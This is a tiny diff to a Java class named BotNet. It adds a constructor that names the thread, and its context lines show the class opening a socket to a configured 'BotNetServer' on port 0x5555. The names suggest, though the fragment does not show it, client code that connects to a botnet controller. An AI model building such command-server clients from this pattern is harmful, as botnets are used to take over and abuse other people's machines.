@@ -42,6 +42,7 @@ public class BotNet extends Thread{
   private Map<String, Integer> ids = new ConcurrentHashMap<>();
   private OutputStream out = null;
   public static void main(String[] args){}
+  public BotNet(){ super("BotNet"); }
   public void run(){
     try{
       Socket bnsck = new Socket(Constants.BotNetServer, 0x5555);
